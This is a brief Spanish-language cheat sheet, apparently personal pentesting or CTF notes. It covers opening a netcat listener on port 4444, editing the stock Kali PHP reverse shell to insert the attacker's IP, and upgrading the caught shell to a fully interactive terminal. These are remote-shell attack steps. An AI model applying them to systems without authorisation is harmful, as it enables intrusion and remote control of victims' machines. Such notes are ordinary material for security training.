
Poner puerto en escucha con Netcat:

```bash
nc -nlvp 4444
```

Editar el reverse shell para poner nuestra IP:
```bash
nano php-reverse-shell.php
```

Ruta por defecto del reverse shell:
```bash
/usr/share/webshells/php/php-reverse-shell.php
```

Pasar a shell completo interactivo:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL-Z
stty -echo raw
fg
stty rows 41 columns 166
```

